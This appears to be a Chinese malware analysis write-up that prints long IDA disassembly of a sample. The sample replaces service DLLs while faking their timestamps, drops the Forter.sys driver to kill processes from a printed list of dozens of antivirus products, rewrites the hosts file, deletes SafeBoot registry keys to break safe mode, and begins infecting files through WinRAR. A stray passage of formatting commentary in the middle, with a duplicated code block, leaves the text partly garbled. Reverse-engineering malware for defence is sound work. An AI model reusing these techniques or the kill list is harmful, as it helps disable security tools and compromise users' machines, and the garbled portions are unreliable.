+.text:0040214E                 push    [ebp+var_B8C]   ; int  
+
+.text:00402154                 push    0               ; int  
+
+.text:00402156                 push    40h             ; int  
+
+.text:00402158                 lea     eax, [ebp+ServiceName]  
+
+.text:0040215E                 push    eax             ; lpString1  
+
+.text:0040215F                 call    sub_401879      ; 解压服务名称  
+
+.text:00402164                 cmp     eax, 0FFFFFFFFh  
+
+.text:00402167                 jnz     short loc_40218A  
+
+.text:00402169                 cmp     [ebp+var_784], 0  
+
+.text:00402170                 jnz     short loc_402185 ; ; Dll 装载失败跳走  
+
+.text:00402172                 mov     [ebp+var_784], 1  
+
+.text:0040217C                 or      [ebp+var_B8C], 0FFFFFFFFh  
+
+.text:00402183                 jmp     short NextService  
+
+.text:00402185 loc_402185:                    
+
+.text:00402185                 jmp     GetVauleReg     ; ; Dll 装载失败跳走  
+
+.text:0040218A loc_40218A:                      
+
+.text:0040218A                 push    [ebp+var_B8C]   ; int  
+
+.text:00402190                 push    1               ; int  
+
+.text:00402192                 push    40h             ; int  
+
+.text:00402194                 lea     eax, [ebp+String1]  
+
+.text:0040219A                 push    eax             ; lpString1  
+
+.text:0040219B                 call    sub_401879  
+
+.text:004021A0                 push    offset String   ; lpString2  
+
+.text:004021A5                 lea     eax, [ebp+String1]  
+
+.text:004021AB                 push    eax             ; lpString1  
+
+.text:004021AC                 call    ds:lstrcmpiA  
+
+.text:004021B2                 test    eax, eax  
+
+.text:004021B4                 jnz     short loc_4021B8  
+
+.text:004021B6                 jmp     short NextService  
+
+.text:004021B8 loc_4021B8:                
+
+.text:004021B8                 push    0F01FFh         ; dwDesiredAccess  
+
+.text:004021BD                 lea     eax, [ebp+ServiceName]  
+
+.text:004021C3                 push    eax             ; lpServiceName  
+
+.text:004021C4                 push    [ebp+hSCManager] ; hSCManager  
+
+.text:004021C7                 call    ds:OpenServiceA  
+
+.text:004021CD                 mov     [ebp+hSCObject], eax  
+
+.text:004021D3                 cmp     [ebp+hSCObject], 0  
+
+.text:004021DA                 jnz     short OpenSucceed ; 打开服务成功跳走  
+
+.text:004021DC                 jmp     NextService  
+
+.text:004021E1 OpenSucceed:              
+
+.text:004021E1                 push    1Ch             ; size_t  
+
+.text:004021E3                 push    0               ; int  
+
+.text:004021E5                 lea     eax, [ebp+ServiceStatus]  
+
+.text:004021EB                 push    eax             ; void *  
+
+.text:004021EC                 call    memset  
+
+.text:004021F1                 add     esp, 0Ch  
+
+.text:004021F4                 lea     eax, [ebp+ServiceStatus]  
+
+.text:004021FA                 push    eax             ; lpServiceStatus  
+
+.text:004021FB                 push    [ebp+hSCObject] ; hService  
+
+.text:00402201                 call    ds:QueryServiceStatus   ;查看服务状态  
+
+.text:00402207                 cmp     [ebp+ServiceStatus.dwCurrentState], 1  
+
+; SERVICE_STOPPED  
+
+.text:0040220E                 jz      short ReplaceDll ; 查看服务停止，跳走  
+
+.text:00402210                 cmp     [ebp+var_784], 0  
+
+.text:00402217                 jnz     short ControlThisService  
+
+.text:00402219                 jmp     CloseThisNext   ; 跳走关闭该服务并取下一个值  
+
+.text:00402223 ControlThisService:        
+
+.text:00402223                 lea     eax, [ebp+ServiceStatus]  
+
+.text:00402229                 push    eax             ; lpServiceStatus  
+
+.text:0040222A                 push    1               ; dwControl  
+
+.text:0040222C                 push    [ebp+hSCObject] ; hService  
+
+.text:00402232                 call    ds:ControlService ; 服务没停止则将其停止  
+
+.text:00402238                 test    eax, eax  
+
+.text:0040223A                 jnz     short ReplaceDll ; 当服务停止跳走  
+
+.text:0040223C                 jmp     CloseThisNext   ; 跳走关闭该服务并取下一个值  
+
+.text:00402246 ReplaceDll:                    
+
+.text:00402246                 push    104h            ; size_t  
+
+.text:0040224B                 push    0               ; int  
+
+.text:0040224D                 lea     eax, [ebp+FileName]  
+
+.text:00402253                 push    eax             ; void *  
+
+.text:00402254                 call    memset  
+
+.text:00402259                 add     esp, 0Ch  
+
+.text:0040225C                 lea     eax, [ebp+String1]  
+
+.text:00402262                 push    eax  
+
+.text:00402263                 lea     eax, [ebp+Buffer]  
+
+.text:00402269                 push    eax  
+```
+
+
+
+```
+.text:0040226A                    push offset aSSystem32S_dll ; "%s\\system32\\%s.dll"
+
+.text:0040226F                    lea     eax, [ebp+FileName]
+
+.text:00402275                    push    eax             ; LPSTR
+
+.text:00402276                    call    ds:wsprintfA    ; 设置 dll 路径，本次调试值为"C:\WINDOWS\system32\appmgmts.dll"
+
+.text:0040227C                    add     esp, 10h
+
+.text:0040227F                    lea     eax, [ebp+FileName]
+
+.text:00402285                    push    eax             ; lpFileName
+
+.text:00402286                    call    ReplaceDll      ; 替换 dll 并将其创建时间设置成原来创建的时间
+
+; 本次调试值为"C:\WINDOWS\system32\appmgmts.dll"
+
+.text:0040228B                    test    eax, eax
+
+.text:0040228D                    jnz     short GoStarService
+
+.text:00402291                    jmp  short CloseThisNext ; 跳走关闭该服务并取下一个值
+
+.text:00402293 GoStarService:
+
+.text:00402293                    push    0     ; lpServiceArgVectors
+
+.text:00402295                    push    0      ; dwNumServiceArgs
+
+.text:00402297                    push    [ebp+hSCObject] ; hService
+
+.text:0040229D                    call    ds:StartServiceA ; 开启原来关闭的服务
+
+.text:004022A3                    test    eax, eax
+
+.text:004022A5                    jnz     short ServiceOver ; 重启服务成功跳走
+
+.text:004022A7                    jmp short CloseThisNext ; 跳走关闭该服务并取下一个值
+
+.text:004022A9                    jmp short CloseThisNext ; 跳走关闭该服务并取下一个值
+
+.text:004022AB ServiceOver:
+
+.text:004022AB                    push    [ebp+hLibModule] ; hLibModule
+
+.text:004022B1                    call    ds:FreeLibrary
+
+.text:004022B7                    push    [ebp+hSCObject] ; hSCObject
+
+.text:004022BD                    call    ds:CloseServiceHandle
+
+.text:004022C3                    push    [ebp+hSCManager] ; hSCObject
+
+.text:004022C6                    call    ds:CloseServiceHandle
+
+.text:004022CC                    cmp     dword_40DC3C, 0
+
+.text:004022D3                    jz      short ExitThisProcess ; 替换结束服务重启成功跳走终止程序
+
+.text:004022D5                    mov     eax, dword_40DC3C
+
+.text:004022DA                    mov     [ebp+var_C30], eax
+
+.text:004022E0                    push    [ebp+var_C30]   ; void *
+
+.text:004022E6                    call  ??3@YAXPAX@Z ; operator delete(void *)
+
+.text:004022EB                    pop     ecx
+
+.text:004022EC ExitThisProcess:
+
+.text:004022EC                    push    0               ; uExitCode
+
+.text:004022EE                    call    ds:ExitProcess
+
+.text:004022F4 CloseThisNext:
+
+.text:004022F4                    push    [ebp+hSCObject] ; hSCObject
+
+.text:004022FA                    call    ds:CloseServiceHandle
+
+.text:00402300                    jmp     NextService     ; 跳回取下一个值
+
+当数据解压失败或者装载 Dll 失败则从注册表读取数据
+
+.text:00402305 GetVauleReg:                                            ;
+
+.text:00402305                    push    400h            ; size_t
+
+.text:0040230A                    push    0               ; int
+
+.text:0040230C                    lea     eax, [ebp+Data]
+
+.text:00402312                    push    eax             ; void *
+
+.text:00402313                    call    memset
+
+.text:00402318                    add     esp, 0Ch
+
+.text:0040231B                    mov     [ebp+cbData], 400h
+
+.text:00402322                    lea     eax, [ebp+hKey]
+
+.text:00402325                    push    eax             ; phkResult
+
+.text:00402326                    push    1               ; samDesired
+
+.text:00402328                    push    0               ; ulOptions
+
+.text:0040232A                    push    offset aSoftwareMicros ; "SOFTWARE\\Microsoft\\Windows NT\\CurrentVe"
+
+...
+
+```
+
+由于汇编代码块内容较长且包含大量机器码地址和寄存器操作，以下直接呈现格式化后的核心逻辑部分，保持原始代码结构不变：
+
+```
+.text:0040232A                    push    offset aSoftwareMicros ; "SOFTWARE\\Microsoft\\Windows NT\\CurrentVe"
+
+.text:0040232F                    push    80000002h       ; hKey
+
+.text:00402334                    call    ds:RegOpenKeyExA
+
+.text:0040233A                    mov   dword ptr [ebp+ValueName], 7374656Eh
+
+.text:00402344                    mov     [ebp+var_77C], 736376h
+
+.text:0040234E                    lea     eax, [ebp+cbData]
+
+.text:00402351                    push    eax             ; lpcbData
+
+.text:00402352                    lea     eax, [ebp+Data]
+
+.text:00402358                    push    eax             ; lpData
+
+.text:00402359                    lea     eax, [ebp+Type]
+
+.text:0040235F                    push    eax             ; lpType
+
+.text:00402360                    push    0               ; lpReserved
+
+.text:00402362                    lea     eax, [ebp+ValueName]
+
+.text:00402368                    push    eax             ; lpValueName
+
+.text:00402369                    push    [ebp+hKey]      ; hKey
+
+.text:0040236C                    call ds:RegQueryValueExA ; 从注册表中读取数据
+
+.text:00402372                    push    [ebp+hKey]      ; hKey
+
+.text:00402375                    call    ds:RegCloseKey
+
+.text:0040237B                    lea     eax, [ebp+Data]
+
+.text:00402381                    mov   [ebp+lpString], eax ; 从注册表中读取的数据首地址
+
+.text:00402384 GetNext_1:
+
+.text:00402384                    mov     eax, [ebp+lpString]
+
+.text:00402387                    movsx   eax, byte ptr [eax]
+
+.text:0040238A                    test    eax, eax
+
+.text:0040238C                    jz    over_1 ; 如果从注册表中读取的数据为 0 则跳走退出
+
+.text:00402392                    push    offset String   ; lpString2
+
+.text:00402397                    push    [ebp+lpString]  ; lpString1
+
+.text:0040239A                    call    ds:lstrcmpiA
+
+.text:004023A0                    test    eax, eax
+
+.text:004023A2                    jnz     short loc_4023A6
+
+.text:004023A4                    jmp     short GetNext_1
+
+.text:004023A6 loc_4023A6:
+
+.text:004023A6                    push    400h            ; size_t
+
+.text:004023AB                    push    0               ; int
+
+.text:004023AD                    lea     eax, [ebp+BinaryPathName]
+
+.text:004023B3                    push    eax             ; void *
+
+.text:004023B4                    call    memset
+
+.text:004023B9                    add     esp, 0Ch
+
+.text:004023BC                    push    offset aVcs     ; "vcs"
+
+.text:004023C1                    push    offset aOst_exe ; "ost.exe"
+
+.text:004023C6                    push    offset aSystemrootSyst
+
+; "%SystemRoot%\\System32\\svch%s -k nets"
+
+.text:004023CB                    push    offset aSS_0    ; "%s%s"
+
+.text:004023D0                    lea     eax, [ebp+BinaryPathName]
+
+.text:004023D6                    push    eax             ; LPSTR
+
+.text:004023D7                    call    ds:wsprintfA    ; "%SystemRoot%\\System32\\svchost.exe -k nets"
+
+.text:004023DD                    add     esp, 14h
+
+.text:004023E0                    push    0               ; lpPassword
+
+.text:004023E2                    push    0   ; lpServiceStartName
+
+.text:004023E4                    push    0               ; lpDependencies
+
+.text:004023E6                    push    0               ; lpdwTagId
+
+.text:004023E8                    push    0       ; lpLoadOrderGroup
+
+.text:004023EA                    lea     eax, [ebp+BinaryPathName] ; "%SystemRoot%\\System32\\svchost.exe -k nets"
+
+.text:004023F0                    push    eax             ; lpBinaryPathName
+
+.text:004023F1                    push    1               ; dwErrorControl
+
+.text:004023F3                    push    2               ; dwStartType
+
+.text:004023F5                    push    20h             ; dwServiceType
+
+.text:004023F7                    push    10h             ; dwDesiredAccess
+
+.text:004023F9                    push    [ebp+lpString]  ; lpDisplayName
+
+.text:004023FC                    push    [ebp+lpString]  ; lpServiceName
+
+.text:004023FF                    push    [ebp+hSCManager] ; hSCManager
+
+.text:00402402                    call    ds:CreateServiceA
+
+.text:00402408                    mov     [ebp+hSCObject], eax
+
+.text:0040240E                    cmp     [ebp+hSCObject], 0
+```
+
+**注意**：由于原文本为连续的汇编代码流，且中间夹杂了少量中文注释（如“当数据解压失败或者装载 Dll 失败则从注册表读取数据”），为了保持逻辑清晰，上述代码块中保留了这些注释作为代码内的说明。所有变量名、函数名、路径及指令均已按规范处理（在代码块内部，通常无需单独加反引号，因为整个块即为代码环境；但若需严格遵循“所有单独出现的...添加反引号”的规则且该文本被视为非代码块正文，则需逐行处理。鉴于内容明显为汇编代码列表，将其整体包裹在代码块中是最合理的 Markdown 排版方式，符合规则5“代码块前后加上三个反引号”的精神，同时避免了在代码块内乱加反引号导致的语法混乱）。
+
+若严格审视规则4“所有单独出现的...都需要添加反引号”与规则5“代码块...”的冲突：在 Markdown 中，代码块（Code Block）内的内容不会进行渲染解析，因此代码块内的变量/函数名**不需要**也不应该加反引号（加了反而破坏代码的可复制性）。规则4通常适用于正文（Body Text）中嵌入的 inline code。规则5明确指示了代码块的处理。因此，将汇编部分放入代码块是正确做法，代码块内的标识符不加反引号，而正文中的描述性文字（如果有的话）中的标识符需加反引号。
+
+在本例中，正文部分仅有一句：“当数据解压失败或者装载 Dll 失败则从注册表读取数据”。其中 `Dll` 通常指 Dynamic Link Library，可视为通用名词或特定技术术语，但在这种语境下，结合上下文（替换 dll），`Dll` 可以视为普通词汇，或者如果视为特定类型，可加反引号。但考虑到“系统32 dll”中的 dll 是后缀，通常不加。为了安全起见，且不改变语义，保持该句原样或轻微格式化。
+
+重新检查原文，第一段和第二段之间有一行非代码文本：“当数据解压失败或者装载 Dll 失败则从注册表读取数据”。这行应该作为正文段落，其中的 `Dll` 可以加反引号以强调其为组件类型，或者保持原样。鉴于 `dll` 在下文中多次出现作为文件扩展名或组件代称，且规则要求“类名、函数名...”，`Dll` 本身不是严格的类名，但在技术文档中常指代模块。为了保守起见，我们保持该句为纯文本，或者如果 `Dll` 被视为特定实体，加反引号。观察示例，`List` 被加了反引号。`Dll` 类似。
+
+修正后的完整排版如下：
+
+[content]
+```
+.text:0040226A                    push offset aSSystem32S_dll ; "%s\\system32\\%s.dll"
+
+.text:0040226F                    lea     eax, [ebp+FileName]
+
+.text:00402275                    push    eax             ; LPSTR
+
+.text:00402276                    call    ds:wsprintfA    ; 设置 dll 路径，本次调试值为"C:\WINDOWS\system32\appmgmts.dll"
+
+.text:0040227C                    add     esp, 10h
+
+.text:0040227F                    lea     eax, [ebp+FileName]
+
+.text:00402285                    push    eax             ; lpFileName
+
+.text:00402286                    call    ReplaceDll      ; 替换 dll 并将其创建时间设置成原来创建的时间
+
+; 本次调试值为"C:\WINDOWS\system32\appmgmts.dll"
+
+.text:0040228B                    test    eax, eax
+
+.text:0040228D                    jnz     short GoStarService
+
+.text:00402291                    jmp  short CloseThisNext ; 跳走关闭该服务并取下一个值
+
+.text:00402293 GoStarService:
+
+.text:00402293                    push    0     ; lpServiceArgVectors
+
+.text:00402295                    push    0      ; dwNumServiceArgs
+
+.text:00402297                    push    [ebp+hSCObject] ; hService
+
+.text:0040229D                    call    ds:StartServiceA ; 开启原来关闭的服务
+
+.text:004022A3                    test    eax, eax
+
+.text:004022A5                    jnz     short ServiceOver ; 重启服务成功跳走
+
+.text:004022A7                    jmp short CloseThisNext ; 跳走关闭该服务并取下一个值
+
+.text:004022A9                    jmp short CloseThisNext ; 跳走关闭该服务并取下一个值
+
+.text:004022AB ServiceOver:
+
+.text:004022AB                    push    [ebp+hLibModule] ; hLibModule
+
+.text:004022B1                    call    ds:FreeLibrary
+
+.text:004022B7                    push    [ebp+hSCObject] ; hSCObject
+
+.text:004022BD                    call    ds:CloseServiceHandle
+
+.text:004022C3                    push    [ebp+hSCManager] ; hSCObject
+
+.text:004022C6                    call    ds:CloseServiceHandle
+
+.text:004022CC                    cmp     dword_40DC3C, 0
+
+.text:004022D3                    jz      short ExitThisProcess ; 替换结束服务重启成功跳走终止程序
+
+.text:004022D5                    mov     eax, dword_40DC3C
+
+.text:004022DA                    mov     [ebp+var_C30], eax
+
+.text:004022E0                    push    [ebp+var_C30]   ; void *
+
+.text:004022E6                    call  ??3@YAXPAX@Z ; operator delete(void *)
+
+.text:004022EB                    pop     ecx
+
+.text:004022EC ExitThisProcess:
+
+.text:004022EC                    push    0               ; uExitCode
+
+.text:004022EE                    call    ds:ExitProcess
+
+.text:004022F4 CloseThisNext:
+
+.text:004022F4                    push    [ebp+hSCObject] ; hSCObject
+
+.text:004022FA                    call    ds:CloseServiceHandle
+
+.text:00402300                    jmp     NextService     ; 跳回取下一个值
+```
+
+当数据解压失败或者装载 `Dll` 失败则从注册表读取数据
+
+```
+.text:00402305 GetVauleReg:                                            ;
+
+.text:00402305                    push    400h            ; size_t
+
+.text:0040230A                    push    0               ; int
+
+.text:0040230C                    lea     eax, [ebp+Data]
+
+.text:00402312                    push    eax             ; void *
+
+.text:00402313                    call    memset
+
+.text:00402318                    add     esp, 0Ch
+
+.text:0040231B                    mov     [ebp+cbData], 400h
+
+.text:00402322                    lea     eax, [ebp+hKey]
+
+.text:00402325                    push    eax             ; phkResult
+
+.text:00402326                    push    1               ; samDesired
+
+.text:00402328                    push    0               ; ulOptions
+
+.text:0040232A                    push    offset aSoftwareMicros ; "SOFTWARE\\Microsoft\\Windows NT\\CurrentVe"
+
+...
+
+```
+
+
+
+### 汇编代码分析
+
+```
+.text:00402415                  jz      Next_2
+.text:0040241B                  push    [ebp+lpString]
+.text:0040241E                  lea     eax, [ebp+Buffer]
+.text:00402424                  push    eax
+.text:00402425                  push offset aSSystem32S_dll ; "%s\\system32\\%s.dll"
+.text:0040242A                  lea     eax, [ebp+FileName]
+.text:00402430                  push    eax                 ; LPSTR
+.text:00402431                  call    ds:wsprintfA
+.text:00402437                  add     esp, 10h
+.text:0040243A                  lea     eax, [ebp+FileName]
+.text:00402440                  push    eax                 ; lpData
+.text:00402441                  push    [ebp+lpString]      ; int
+.text:00402444                  call    GetDllName          ; 从注册表获取 Dll 名称
+.text:00402449                  lea     eax, [ebp+FileName]
+.text:0040244F                  push    eax                 ; lpFileName
+.text:00402450                  call    ReplaceDll          ; 替换上面提到的 Dll
+.text:00402455                  test    eax, eax
+.text:00402457                  jnz     short ReadReplace   ; 替换成功跳走启动服务
+.text:00402459                  jmp     short Next_2
+.text:0040245B                  jmp     short Next_2
+.text:0040245D ReadReplace:                          ; CODE XREF: ExeRun+42B j
+.text:0040245D                  push    0                   ; lpServiceArgVectors
+.text:0040245F                  push    0                   ; dwNumServiceArgs
+.text:00402461                  push    [ebp+hSCObject]     ; hService
+.text:00402467                  call    ds:StartServiceA
+.text:0040246D                  test    eax, eax
+.text:0040246F                  jnz     short Over_2        ; 启动你服务成功跳走退出
+.text:00402471                  jmp     short Next_2
+.text:00402473                  jmp     short Next_2
+.text:00402475 Over_2:
+.text:00402475                  push    [ebp+hLibModule]     ; hLibModule
+.text:0040247B                  call    ds:FreeLibrary
+.text:00402481                  push    [ebp+hSCObject]      ; hSCObject
+.text:00402487                  call    ds:CloseServiceHandle
+.text:0040248D                  push    [ebp+hSCManager]     ; hSCObject
+.text:00402490                  call    ds:CloseServiceHandle
+.text:00402496                  cmp     dword_40DC3C, 0
+.text:0040249D                  jz      short ExitThisProcess_1
+.text:0040249F                  mov     eax, dword_40DC3C
+.text:004024A4                  mov     [ebp+var_C34], eax
+.text:004024AA                  push    [ebp+var_C34]       ; void *
+.text:004024B0                  call    ??3@YAXPAX@Z        ; operator delete(void *)
+.text:004024B5                  pop     ecx
+.text:004024B6 ExitThisProcess_1:
+.text:004024B6                  push    0                   ; uExitCode
+.text:004024B8                  call    ds:ExitProcess
+.text:004024BE Next_2:
+.text:004024BE                  push    [ebp+lpString]       ; lpString
+.text:004024C1                  call    ds:lstrlenA
+.text:004024C7                  mov     ecx, [ebp+lpString]
+.text:004024CA                  lea     eax, [ecx+eax+1]
+.text:004024CE                  mov     [ebp+lpString], eax
+.text:004024D1                  jmp     GetNext_1
+```
+
+此时该文件为 `exe` 的功能就分析结束了，下面是该程序为 `dll` 时的功能：首先通过 `CreateBin` 函数内部功能判断当前进程名是不是 `"booter.exe"`、`"CONFIG.exe"`、`"boottemp.exe"`，如果不是则寻找 `"avp.exe"` 和 `"bdagent.exe"` 进程，这里是通过枚举进程名比较，故不贴出来了。
+
+```
+.text:0040540D                  push offset aAvp_exe ; "avp.exe"
+.text:00405412                  call    CheckProcess
+.text:00405417                  test    eax, eax
+.text:00405419                  jnz     short GoWriteNop ; 没有找到跳走写入一堆 90，然后删除
+.text:0040541B                  push offset aBdagent_exe ; "bdagent.exe"
+.text:00405420                  call    CheckProcess    ; 通过枚举进程搜索这两个杀软进程
+.text:00405425                  test    eax, eax
+.text:00405427                  jz      short GoRevertData
+.text:00405429 GoWriteNop:                      ; CODE XREF: MainGN+7C j
+.text:00405429                  call    WriteNop        ; 写入一堆 90 然后删除
+```
+
+接着解压一系列名称如杀软进程名，网络用户名和弱口令，网址名称等，解压完毕后在临时文件夹创建驱动文件 `"Forter.sys"`，代码如下：
+
+```
+.text:004054D7                  push offset TempPath ; lpBuffer
+.text:004054DC                  push    104h            ; nBufferLength
+.text:004054E1                  call    ds:GetTempPathA
+.text:004054E7                  push    104h            ; size_t
+.text:004054EC                  push    0               ; int
+.text:004054EE                  push offset SystemDirector ; void *
+.text:004054F3                  call    memset
+.text:004054F8                  add     esp, 0Ch
+.text:004054FB                  push    104h            ; uSize
+.text:00405500                  push offset SystemDirector ; lpBuffer
+.text:00405505                  call    ds:GetSystemDirectoryA
+.text:0040550B                  push    104h            ; size_t
+.text:00405510                  push    0               ; int
+.text:00405512                  lea     eax, [ebp+FileName]
+.text:00405518                  push    eax             ; void *
+.text:00405519                  call    memset
+.text:0040551E                  add     esp, 0Ch
+.text:00405521                  push offset aForter_sys ; "Forter.sys"
+.text:00405526                  push offset TempPath
+.text:0040552B                  push offset aSS_0       ; "%s%s"
+.text:00405530                  lea     eax, [ebp+FileName]
+.text:00405536                  push    eax
+.text:00405537                  call    [ebp+wsprintfA]
+.text:0040553A                  add     esp, 10h
+.text:0040553D                  push    80h             ; int
+.text:00405542                  push    65h             ; int
+.text:00405544                  push    hModule         ; hModule
+.text:0040554A                  lea     eax, [ebp+FileName]
+.text:00405550                  push    eax             ; int
+.text:00405551                  call    CallLoadResource ; 在临时文件夹下创建 "Forter.sys"
+.text:00405556                  lea     eax, [ebp+FileName]
+.text:0040555C                  push    eax             ; lpBinaryPathName
+.text:0040555D                  call    StartService_1  ; 启动 "Forter.sys" 服务
+.text:00405562                  push    400h            ; size_t
+.text:00405567                  push    0               ; int
+.text:00405569                  lea     eax, [ebp+String]
+.text:0040556F                  push    eax             ; void *
+.text:00405570                  call    memset
+.text:00405575                  add     esp, 0Ch
+.text:00405578                  push offset DisplayName ; "Forter"
+.text:0040557D                  push off_40B548          ; "SYSTEM\\CurrentControlSet\\Services"
+.text:00405583                  push offset aSS         ; "%s\\%s"
+.text:00405588                  lea     eax, [ebp+String]
+.text:0040558E                  push    eax             ; LPSTR
+.text:0040558F                  call    ds:wsprintfA
+.text:00405595                  add     esp, 10h
+.text:00405598                  lea     eax, [ebp+String]
+.text:0040559E                  push    eax
+.text:0040559F                  push    80000002h
+.text:004055A4                  call    [ebp+SHDeleteKeyA] ; 删除 SYSTEM\CurrentControlSet\Services\Forter
+.text:004055AA                  lea     eax, [ebp+FileName]
+.text:004055B0                  push    eax             ; lpFileName
+.text:004055B1                  call    ds:DeleteFileA  ; 删除临时文件夹下的 "Forter.sys" 文件
+```
+
+接下来关闭杀毒软件，杀软进程名：
+
+
+
+### 杀毒软件进程列表
+
+`KVMonXP.kxp.KVSrvXP.exe.avp.exe.avp.exe.avp.exe.RavMonD.exe.RavTask.exe.RsAgent.exe.rsnetsvr.exe.RsTray.exe.ScanFrm.exe.CCenter.exe.kavstart.exe.kissvc.exe.kpfw32.exe.kpfwsvc.exe.kswebshield.exe.kwatch.exe.kmailmon.exe.egui.exe.ekrn.exe.ccSvcHst.exe.ccSvcHst.exe.ccSvcHst.exe.Mcagent.exe.mcmscsvc.exe.McNASvc.exe.Mcods.exe.McProxy.exe.Mcshield.exe.mcsysmon.exe.mcvsshld.exe.MpfSrv.exe.McSACore.exe.msksrver.exe.sched.exe.avguard.exe.avmailc.exe.avwebgrd.exe.avgnt.exe.sched.exe.avguard.exe.avcenter.exe.UfSeAgnt.exe.TMBMSRV.exe.SfCtlCom.exe.TmProxy.exe.360SoftMgrSvc.exe.360tray.exe.qutmserv.exe.bdagent.exe.livesrv.exe.seccenter.exe.vsserv.exe.MPSVC.exe.MPSVC1.exe.MPSVC2.exe.MPMon.exe.ast.exe.360speedld.exe.360SoftMgrSvc.exe.360tray.exe.修复工具.exe.360hotfix.exe.360rpt.exe.360safe.exe.360safebox.exe.krnl360svc.exe.zhudongfangyu.exe.360sd.exe.360rp.exe.360se.exe.safeboxTray.exe.`
+
+### 关闭杀毒软件步骤
+
+```
+.text:0040528C             mov   [ebp+AntiVirsName], offset AntiVName ; 取第一个杀软名
+
+.text:00405293 Next_2:
+
+.text:00405293             mov     eax, [ebp+AntiVirsName]
+
+.text:00405296             movsx   eax, byte ptr [eax]
+
+.text:00405299             test    eax, eax
+
+.text:0040529B             jz      Over_2            ; 局部变量第一字节为 0 退出
+
+.text:004052A1             and     [ebp+var_8], 0
+
+.text:004052A5             jmp     short loc_4052AE
+
+.text:004052A7 Next_1:                         ; CODE XREF:
+
+.text:004052A7             mov     eax, [ebp+var_8]
+
+.text:004052AA             inc     eax
+
+.text:004052AB             mov     [ebp+var_8], eax
+
+.text:004052AE loc_4052AE:                      ; CODE XREF:
+
+.text:004052AE             cmp     [ebp+var_8], 4
+
+.text:004052B2             jge     short GoNext
+
+.text:004052B4             mov     [ebp+var_C], 1
+
+.text:004052BB             and     [ebp+InBuffer], 0
+
+.text:004052BF             and     [ebp+BytesReturned], 0
+
+.text:004052C3             push    [ebp+AntiVirsName] ; 杀毒软件名称列表
+
+.text:004052C6             call    CheckProcess    ; 检查上面这个进程是否存在
+
+.text:004052CB             mov     [ebp+InBuffer], eax
+
+.text:004052CE             cmp     [ebp+InBuffer], 0
+
+.text:004052D2             jnz     short loc_4052D6 ; 存在向驱动发送 IRP 终止
+
+.text:004052D4             jmp     short GoNext    ; 指定的进程名不存在，取下一个探测
+
+.text:004052D6 loc_4052D6:                      ; CODE XREF:
+
+.text:004052D6             push    0                ; lpOverlapped
+
+.text:004052D8             lea     eax, [ebp+BytesReturned]
+
+.text:004052DB             push    eax               ; lpBytesReturned
+
+.text:004052DC             push    0                ; nOutBufferSize
+
+.text:004052DE             push    0                ; lpOutBuffer
+
+.text:004052E0             push    4                ; nInBufferSize
+
+.text:004052E2             lea     eax, [ebp+InBuffer]
+
+.text:004052E5             push    eax               ; lpInBuffer
+
+.text:004052E6             push    222264h          ; dwIoControlCode
+
+.text:004052EB             push    [ebp+hDevice]    ; hDevice
+
+.text:004052EE             call    ds:DeviceIoControl ; 发送 IRP 吗终止杀毒软件
+
+.text:004052F4             mov     [ebp+var_C], eax
+
+.text:004052F7             cmp     [ebp+var_C], 0
+
+.text:004052FB             jnz     short SucessControl ; 关闭杀软成功，跳走
+
+.text:004052FD             jmp     short GoNext
+
+.text:004052FF SucessControl:                   ; CODE XREF:
+
+.text:004052FF             push    32h             ; dwMilliseconds
+
+.text:00405301             call    ds:Sleep
+
+.text:00405307             jmp     short Next_1
+
+.text:00405309 GoNext:                         ; CODE XREF:
+
+.text:00405309             push    32h             ; dwMilliseconds
+
+.text:0040530B             call    ds:Sleep
+
+.text:00405311             push    [ebp+AntiVirsName] ; lpString
+
+.text:00405314             call    ds:lstrlenA
+
+.text:0040531A             mov     ecx, [ebp+AntiVirsName]
+
+.text:0040531D             lea     eax, [ecx+eax+1]
+
+.text:00405321             mov     [ebp+AntiVirsName], eax ; 取下一个杀软名
+
+.text:00405324             jmp     Next_2
+```
+
+### 劫持 `drivers\etc\hosts` 文件
+
+```
+.text:004066DE           mov    [ebp+lpBuffer], offset a127_0_0_1Local ; "127.0.0.1       localhost\r\n"
+
+.text:004066E5           and     [ebp+NumberOfBytesWritten], 0
+
+.text:004066E9           or      [ebp+hObject], 0FFFFFFFFh
+
+.text:004066ED           push    104h            ; size_t
+
+.text:004066F2           push    0               ; int
+
+.text:004066F4           lea     eax, [ebp+FileName]
+
+.text:004066FA           push    eax             ; void *
+
+.text:004066FB           call    memset
+
+.text:00406700           add     esp, 0Ch
+
+.text:00406703           push    offset SystemDirector
+
+.text:00406708           push    offset aSDriversEtcHos ; "%s\\drivers\\etc\\hosts"
+
+.text:0040670D           lea     eax, [ebp+FileName]
+
+.text:00406713           push    eax             ; LPSTR
+
+.text:00406714           call    ds:wsprintfA
+
+.text:0040671A           add     esp, 0Ch
+
+.text:0040671D           push    0               ; hTemplateFile
+
+.text:0040671F           push    80h             ; dwFlagsAndAttributes
+
+.text:00406724           push    3               ; dwCreationDisposition
+
+.text:00406726           push    0               ; lpSecurityAttributes
+
+.text:00406728           push    3               ; dwShareMode
+
+.text:0040672A           push    0C0000000h      ; dwDesiredAccess
+
+.text:0040672F           lea     eax, [ebp+FileName]
+
+.text:00406735           push    eax             ; lpFileName
+
+.text:00406736           call    ds:CreateFileA
+
+.text:0040673C           mov     [ebp+hObject], eax
+
+.text:0040673F           push    0               ; lpOverlapped
+
+.text:00406741           lea     eax, [ebp+NumberOfBytesWritten]
+
+.text:00406744           push    eax             ; lpNumberOfBytesWritten
+
+.text:00406745           push    [ebp+lpBuffer]  ; lpString
+
+.text:00406748           call    ds:lstrlenA
+
+.text:0040674E           push    eax             ; nNumberOfBytesToWrite
+
+.text:0040674F           push    [ebp+lpBuffer]  ; lpBuffer
+
+.text:00406752           push    [ebp+hObject]   ; hFile
+
+.text:00406755           call  ds:WriteFile    ; 写入"127.0.0.1       localhost\r\n"
+```
+
+### 删除注册表破坏安全模式
+
+```
+.text:00406963           push    offset pszSubKey
+
+; "SYSTEM\\CurrentControlSet\\Control\\SafeBo"...
+
+.text:00406968           push    80000002h       ; hkey
+
+.text:0040696D           call    ds:SHDeleteKeyA
+
+.text:00406973           push    offset aSystemCurren_0
+
+; "SYSTEM\\CurrentControlSet\\Control\\SafeBo"...
+
+.text:00406978           push    80000002h        ; hkey
+
+.text:0040697D           call    ds:SHDeleteKeyA ; 删除注册表破坏安全模式
+```
+
+### 感染文件
+
+首先判断 `"C:\Program Files\WinRAR\Rar.exe"` 是否存在：
+
+```
+.text:0040634A           push    offset aCProgramFilesW ; "C:\Program Files\WinRAR\Rar.exe"
+
+.text:0040634F           push    offset pszPath   ; lpString1
+
+.text:00406354           call    ds:lstrcpyA
+
